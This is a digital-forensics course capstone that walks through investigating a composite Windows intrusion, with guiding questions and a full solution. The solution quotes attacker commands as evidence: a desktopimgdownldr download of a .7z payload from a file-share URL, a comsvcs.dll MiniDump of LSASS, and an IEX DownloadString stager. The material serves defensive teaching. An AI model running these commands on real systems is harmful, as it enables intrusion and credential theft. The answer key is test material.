# Module 11 — Capstone: "Operation Hollow Update"

> **The final exam.** Everything you learned in Modules 1-10 — the Triad, event-log parsing, Sigma hunting, credential theft, lateral movement, PowerShell, Sysmon — comes together here on **one** intrusion. You're handed a triage collection, you work the case, and you produce a **timeline + findings report**. Guiding questions first; then a walkthrough; then the full solution. **Try the questions before you read the solution.**

> **Read me first — how this case is built (be honest about your evidence).** This capstone is a **composite teaching scenario**. It does **not** ship a new gigabyte of data — it *reuses the real sample data already in Modules 1-10*, woven into one narrative so you can practise an end-to-end investigation without new downloads. The Part A host (`DESKTOP-SDN1RPT`) artifacts are a single real intrusion (DFIR Madness Case 001); the Part B `.evtx` are real attack-technique captures from public libraries (EVTX-ATTACK-SAMPLES, hayabusa-sample-evtx) that represent the *techniques* an intruder would use — they come from different captures and **do not share one wall-clock**. So you build the timeline as an **attack-phase narrative** (ordered by the intrusion kill-chain), pinning real timestamps where the host data provides them and ordering the Part B techniques logically. Full provenance, the artifact→module map, and licences are in [`data/README.md`](data/README.md). This is exactly how real composite training ranges (and many tabletop exercises) work — and naming that openly is itself a DFIR lesson: *know what your evidence is and isn't.*

---

## 1. The scenario

**Client:** *Harmon Foods*, a mid-size food manufacturer. **Domain:** `harmonfoods.local`.

**The call.** At 09:12 local time, the SOC pages you. Two days ago an employee on the front-office desktop `DESKTOP-SDN1RPT` reported that "Windows kept popping a weird update window in the middle of the night." IT shrugged it off. Last night, the **EDR flagged a credential-dumping alert on a Domain Controller**, and this morning a **finance workstation logged a remote logon from the front-office desktop at 03:00** — a path that should never exist. Management fears an intruder is moving toward the finance systems. You're given a **triage collection** pulled from the affected hosts and told: *find out what happened, how far it spread, and whether the domain's credentials are burned.*

**Your deliverables (same as a real engagement):**
1. A **timeline** of attacker activity (phase-ordered, UTC, with the artifact that proves each step).
2. A **findings report**: initial access, execution, what was stolen, how they moved, and scope.
3. **IOCs** to sweep the rest of the fleet.
4. A **containment recommendation.**

---

## 2. The evidence you're given

The triage collection *is* the Modules 1-10 `data/` folders. Each maps to a host/phase of this case. You do **not** need to copy anything — `cd` into the relevant module's `data/` and run the container there, exactly as you did in that module.

| Phase of the case | Use the data in… | Represents |
|---|---|---|
| **Patient-zero execution evidence (the Triad)** | `module-01…/data`, `module-02…/data`, `module-03…/data` | `DESKTOP-SDN1RPT` Prefetch, ShimCache, Amcache |
| **Fleet sweep for the bad binary** | `module-04…/data` | the same host + peer workstations (stacking) |
| **Initial access / download** | `module-05…/data` | LOLBAS download (`desktopimgdownldr` → `.7z`) |
| **Triage the whole log set with rules** | `module-06…/data` | 23 attack-technique logs to Sigma-hunt |
| **Credential theft** | `module-07…/data` | LSASS dumps + DCSync on a DC |
| **Lateral movement** | `module-08…/data` | PsExec, DCOM, scheduled tasks, RDP, Pass-the-Hash |
| **PowerShell tradecraft** | `module-09…/data` | 4104 script blocks, in-memory PowerShell |
| **Sensor / centralisation view** | `module-10…/data` | Sysmon vs default logging (incl. a DC attack) |

> **Container reminder:** from any module's `data/` folder,
> `docker run -it --rm --network none -v "$PWD":/data dfir-aio:v2` → evidence at `/data`. (PowerShell: `-v "${PWD}:/data"`.)

---

## 3. Guiding questions (answer these first)

Work the case in kill-chain order. Write your answer to each before looking at the walkthrough or solution.

**A. Initial access — how did they get in?** *(Module 5 data)*
1. Parse the event logs to one timeline. What legitimate Windows binary was abused to download a file, what was the URL, and what file type landed? Which two channels both recorded it, and why does that matter?

**B. Execution on patient zero — what ran, and is it malware?** *(Modules 1-3 data)*
2. On `DESKTOP-SDN1RPT`, find the executable that masquerades as a system updater. When did it run (UTC), how many times, and how many files did it load?
3. Build its **identity card** from Amcache: SHA1, size, path, `IsOsComponent`, ProductName. Give three reasons it's malware.
4. Apply the **Triad**: which of Prefetch / ShimCache / Amcache contain this file, and which doesn't? What does the gap mean?

**C. Scope on one host → the fleet.** *(Module 4 data)*
5. You now hold the malware's SHA1. Write the stacking hypothesis and the command you'd run across 500 hosts. On the three hosts you *do* have, how many carry the file, and why isn't "rare" enough to convict on its own?

**D. Credential theft — are the domain's secrets burned?** *(Module 7 + Module 10 data)*
6. Identify **three different** LSASS credential-theft techniques in the data by their Sysmon 10 `GrantedAccess` masks and source images.
7. One technique doesn't touch LSASS at all but steals domain password data from a Domain Controller. Name it, name the event ID, and explain how you tell the malicious case from normal replication.

**E. Lateral movement — how did they spread to finance?** *(Module 8 data)*
8. Find a **service-based** remote-execution (PsExec-style) hop: which event proves the service install, which proves the carrier logon, and how do you tie them to one session?
9. Find a **Pass-the-Hash** logon. What Logon Type signals it, and how does it connect back to the credential theft in section D?
10. Find the **RDP** connection toward the finance host. Which event carries the source IP, and why is it useful even if the logon failed?

**F. PowerShell — what did they actually type?** *(Module 9 data)*
11. Read a 4104 script block. What intent is visible even though the launch command was encoded? Name one technique that would be *invisible* to 4104 and the Sysmon IDs that catch it instead.

**G. Synthesis.**
12. Produce the **attack-phase timeline** and a 5-line findings summary. List your **IOCs** and one **containment** action.

---

## 4. Walkthrough (how to work it)

You don't need new commands — every one of these is from the module you're pointing at. Here's the order and the *why*.

### Step 1 — Establish initial access (Module 5)
```bash
cd module-05-evtx-evtxecmd/data
docker run -it --rm --network none -v "$PWD":/data dfir-aio:v2
# inside:
EvtxECmd -d /data --csv /data --csvf timeline.csv
grep -i "uguu.se\|desktopimgdownldr" /data/timeline.csv
```
Sort `timeline.csv` by `TimeCreated`. You're looking for a **trusted binary used as a downloader** (a LOLBAS) and the **same URL in more than one channel** (Sysmon command line *and* the BITS service that did the fetch). That's your entry point and your first corroboration.

### Step 2 — Prove execution on patient zero (the Triad — Modules 1-3)
```bash
# Module 1 — did it run?
cd ../../module-01-prefetch-pecmd/data
docker run -it --rm --network none -v "$PWD":/data dfir-aio:v2
prefetch /data/prefetch/COREUPDATER.EXE-157C54BB.pf | grep -E "Run count|Last run time: 1|Number of filenames"
# Module 3 — what is it? (SHA1 identity)
#   in module-03…/data:  grep -i coreupdater amcache_UnassociatedFileEntries.csv
# Module 2 — did the OS see it? (the gap)
#   in module-02…/data:  grep -i coreupdater shimcache.csv   # → nothing
```
Prefetch gives you *ran, when, how often, files loaded*. Amcache gives you *SHA1 + metadata*. ShimCache's **silence** is the Triad gap — note it, don't be fooled by it.

### Step 3 — Scope to the fleet (Module 4)
With the SHA1 in hand, **stack** it across hosts. On the bundled three, confirm the malware is on `DESKTOP` only (Count = 1) while OS binaries are Count = 3. The same `stack "FileName,Sha1"` idea runs across 500 hosts to surface every infected box. Remember the trap: rare *benign* apps are also Count = 1 — **rarity finds candidates, metadata convicts.**

### Step 4 — Triage everything with rules (Module 6)
```bash
cd ../../module-06-sigma-chainsaw-hayabusa/data
docker run -it --rm --network none -v "$PWD":/data dfir-aio:v2
hayabusa csv-timeline -d /data -o /data/all-timeline.csv
chainsaw hunt /data -s /sigma --mapping /chainsaw/mappings/sigma-event-logs-all.yml
```
Run **both** engines over the whole folder. Hayabusa ranks by severity (reading order); Chainsaw names the technique with evidence. This is how you turn 20-plus logs into a prioritised lead list in two commands.

### Step 5 — Credential theft (Modules 7 & 10)
In `module-07…/data`, read the **Sysmon 10** events on `lsass.exe` and record each **`GrantedAccess`** mask + source image — that's how you tell Mimikatz.exe from Invoke-Mimikatz from a `comsvcs` MiniDump. Then find the **4662 DCSync** on the DC. Cross-check the Sysmon-10+11 dump view in `module-10…/data`.

### Step 6 — Lateral movement (Module 8)
For each hop, find the **delivery event** (7045 service, 5145 pipe, Sysmon 17/18, 4698/4702 task, RdpCoreTS 131) **and** the **carrier logon** (4624 Type 3 + 4672), and bind them by **time + LogonId**. The Pass-the-Hash logon (Type 9) links the spread back to Step 5's theft.

### Step 7 — PowerShell intent (Module 9)
Read the **4104** `ScriptBlockText` for the decoded commands (`IEX`, `DownloadString`, `MiniDumpWriteDump`, `Get-Process lsass`). Note that **unmanaged/in-memory PowerShell** evades 4104 and is caught by Sysmon **7/8/10** instead.

### Step 8 — Assemble the report
Lay every proven step on one phase-ordered timeline, write the findings, list IOCs, recommend containment.

---

## 5. Solution

> Spoilers. Values verified against the bundled data in the `dfir-aio:v2` container.

### A. Initial access
A LOLBAS download: **`desktopimgdownldr.exe`** (a legit Windows lockscreen-image tool) was abused with
`desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr`
to fetch a **`.7z` archive** from **`a.uguu.se`** (a throwaway file-share host). It was recorded in **two channels** — **Sysmon (Event 1, the command line)** *and* **BITS-Client (59/60, the service that performed the transfer)**. Two independent records of the same download = high-confidence initial access. *(Module 5.)*

### B. Execution on patient zero (`DESKTOP-SDN1RPT`)
- The masquerading binary is **`coreupdater.exe`** in `C:\Windows\System32\`. Prefetch: **RunCount 1**, **last run 2020-09-19 03:40:49 UTC**, **51 files loaded**.
- **Identity card (Amcache):** SHA1 **`fd153c66386ca93ec9993d66a84d6f0d129a3a5c`**, size **7,168 bytes**, path `c:\windows\system32\coreupdater.exe`, **`IsOsComponent = False`**, **ProductName empty**, `FileKeyLastWrite` **2020-09-19 03:40:45 UTC**.
- **Why it's malware (any three):** a System32-named "updater" that is **not** an OS component; **no** product/version metadata; tiny **7 KB**; appeared/ran in the **incident window**; name engineered to blend in.
- **Triad:** present in **Amcache** (identity) and **Prefetch** (execution), **absent** from **ShimCache**. The gap doesn't exonerate it — two artifacts already prove identity *and* execution; ShimCache simply didn't record this path. *(Modules 1-3.)*

### C. Fleet scope
Hypothesis: *"Hosts carrying SHA1 `fd153c66…` are compromised; it'll be rare (low count) against ubiquitous OS binaries."* Command shape: `AppCompatProcessor … stack "FileName,Sha1"` across all hosts. On the bundled three, **`coreupdater.exe` is on `DESKTOP` only (Count = 1)**; `WORKSTATION-07/12` are clean. But `chrome.exe`/`firefox.exe`/`code.exe` are *also* Count = 1 — so rarity gave a **candidate list**; the **metadata** convicted. *(Module 4.)*

### D. Credential theft — domain secrets are burned
Three distinct LSASS techniques, by **Sysmon 10 mask + source**:
- **Invoke-Mimikatz** (PowerShell port) — `GrantedAccess` **`0x143a`**, source **`powershell.exe`**.
- **Mimikatz.exe `sekurlsa::logonpasswords`** — `GrantedAccess` **`0x1010`**, source **`mimikatz.exe`**.
- **`comsvcs.dll` MiniDump (LOLBAS)** — `rundll32 … comsvcs.dll, MiniDump <lsass-PID> <file> full` (Sysmon 1 + 10), and the matching **Sysmon 10 + 11** (.dmp written) view in Module 10.
And the domain-level theft: **DCSync** — **Security Event 4662** on the DC where a **user** account requests **directory replication**. A user replicating password data is DCSync; only a **DC computer account** should replicate. **Verdict: domain credentials must be treated as compromised.** *(Modules 7 & 10.)*

### E. Lateral movement to finance
- **PsExec-style service hop:** **7045** (service installed, ImagePath betraying a fake service name) + **5145** on the service pipe (`svcctl`/`PSEXESVC`/renamed) + Sysmon **17/18**, paired with the **carrier logon 4624 Type 3 + 4672**, bound by **LogonId**.
- **Pass-the-Hash:** a **4624 Logon Type 9 (NewCredentials)** — authentication with a stolen *hash*, no plaintext. It connects directly to section D: the hash came from the LSASS dumps.
- **RDP toward finance:** **RdpCoreTS 131** carries the **client IP** of the connecting host — useful even on a *failed* logon, because it records the source of the attempt before authentication. *(Module 8.)*

### F. PowerShell intent
The **4104** script blocks decode to credential-dump and downloader intent — `MiniDumpWriteDump` + `Get-Process lsass` (dump LSASS in pure PowerShell) and `IEX (New-Object Net.WebClient).DownloadString(...)` (stager) — visible **even though the launch was Base64**, because 4104 logs the compiled script. What's **invisible to 4104**: **unmanaged/in-memory PowerShell** (the engine hosted inside another process) — caught instead by Sysmon **7** (`System.Management.Automation.dll` in a non-PS process), **8** (CreateRemoteThread), **10** (LSASS access). *(Module 9.)*

### G. Attack-phase timeline & findings

**Timeline (kill-chain order; real UTC where the host data provides it):**
```
PHASE 1  Initial access   desktopimgdownldr.exe → https://a.uguu.se/...Bin.7z  (Sysmon 1 + BITS 59/60)
PHASE 2  Execution        2020-09-19 03:40:49 UTC  coreupdater.exe runs on DESKTOP-SDN1RPT
                          (Prefetch runs=1, 51 files; Amcache SHA1 fd153c66…; NOT in ShimCache)
                          LOLBins cluster 03:13–05:09: cmd.exe (x9), rundll32 (run @03:40:45), powershell
PHASE 3  Cred access      LSASS dumped — Invoke-Mimikatz 0x143a / mimikatz.exe 0x1010 / comsvcs MiniDump
                          DCSync on DC — Security 4662, user requests replication  → domain creds burned
PHASE 4  Lateral movement PsExec service (7045 + 5145 + 4624 T3/4672, same LogonId);
                          Pass-the-Hash (4624 Type 9); RDP toward finance (RdpCoreTS 131, source IP)
PHASE 5  Hands-on-keyboard PowerShell 4104: MiniDumpWriteDump/Get-Process lsass, IEX DownloadString
```

**Findings (5 lines):**
1. **Initial access** via a LOLBAS download (`desktopimgdownldr` → `a.uguu.se/...Bin.7z`) on the front-office desktop.
2. **Execution & foothold:** `coreupdater.exe` (SHA1 `fd153c66…`), a 7 KB non-OS binary masquerading in System32, ran 2020-09-19 03:40:49 UTC.
3. **Credential theft is confirmed and domain-wide:** multiple LSASS-dump techniques **plus DCSync** on a DC — treat all domain credentials as compromised.
4. **Lateral movement reached finance** via PsExec service install, Pass-the-Hash, and RDP — each with its carrier logon.
5. **Hands-on-keyboard** activity via obfuscated PowerShell; some PowerShell ran in-memory (Sysmon-only visibility).

**IOCs to sweep the fleet:**
- File hash **SHA1 `fd153c66386ca93ec9993d66a84d6f0d129a3a5c`** (`coreupdater.exe`, 7,168 bytes, System32).
- Network: **`a.uguu.se`**, URL path `…/Hv0bgvgHGNeH_Bin.7z`.
- Behaviour: `desktopimgdownldr.exe /lockscreenurl:`; `rundll32 … comsvcs.dll, MiniDump`; Sysmon 10 on `lsass.exe` with masks `0x1010`/`0x143a`; 4662 replication by a non-DC account; 4624 **Type 9** logons; 7045 fake-service installs.

**Containment recommendation (one):** **Force a domain-wide credential reset — including the `krbtgt` account (twice) and all privileged accounts — and isolate `DESKTOP-SDN1RPT` and any host bearing SHA1 `fd153c66…`,** because DCSync means the attacker can forge tickets until the keys are rotated. (Then: hunt the IOCs fleet-wide via the WEF-collected logs — Module 10 — and stack the SHA1 across all hosts — Module 4.)

---

## 6. What this capstone proved you can do

- Take a **triage collection** and, with no prior knowledge of the case, reconstruct an intrusion **end-to-end**.
- Use the **Triad** to prove execution and identity on patient zero, then **scale** the scope to the fleet by hash.
- Read the **event logs** for the full attacker story — initial access, **credential theft** (incl. DCSync), **lateral movement**, and **PowerShell** intent — and tie events together by **time and LogonId**.
- Run **Sigma** engines to triage at speed, and know what each **Sysmon** ID and **WEF** give you.
- Deliver a **timeline, findings, IOCs, and a containment call** — the actual product of an investigation.

> **"Master the Triad. Close the Gap."** — you just did, end to end.

## Sources & further reading
- DFIR Madness — *Case 001, "The Stolen Szechuan Sauce"* (the patient-zero host data): <https://dfirmadness.com/the-stolen-szechuan-sauce/>
- @sbousseaden — *EVTX-ATTACK-SAMPLES* (the technique captures, GPLv3): <https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES>
- Yamato Security — *hayabusa-sample-evtx*: <https://github.com/Yamato-Security/hayabusa-sample-evtx>
- MITRE ATT&CK — the kill-chain tactics used here (Initial Access, Execution, Credential Access, Lateral Movement): <https://attack.mitre.org/>
- JPCERT/CC — *Detecting Lateral Movement through Tracking Event Logs*: <https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf>
- See [`data/README.md`](data/README.md) for the full artifact→module map, provenance, and licences.

---
*Back to the [course guide](../COURSE.md) · [curriculum](../README.md). Answers to every module's exercises are in [ANSWER-KEY.md](../ANSWER-KEY.md); terms are defined in [GLOSSARY.md](../GLOSSARY.md).*
